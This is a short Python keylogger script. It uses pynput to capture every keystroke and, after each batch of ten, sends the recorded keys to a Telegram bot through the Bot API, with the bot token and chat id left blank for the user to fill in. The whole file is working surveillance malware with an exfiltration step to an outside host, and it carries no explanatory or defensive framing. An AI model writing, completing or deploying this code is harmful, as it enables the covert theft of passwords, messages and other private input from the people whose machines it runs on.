import pynput
from pynput.keyboard import Key, Listener
import requests

count = 0
keys = []

BOT_TOKEN = ''
CHAT_ID = ''


def send_to_telegram(message):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    data = {
        "chat_id": CHAT_ID,
        "text": message
    }
    requests.post(url, data=data)

def on_press(key):
    global keys, count
    keys.append(key)
    count += 1
    print(f"{key} pressed")

    if count >= 10:
        count = 0
        send_to_telegram(' '.join(str(k) for k in keys))
        keys = []

def on_release(key):
    if key == Key.esc:
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
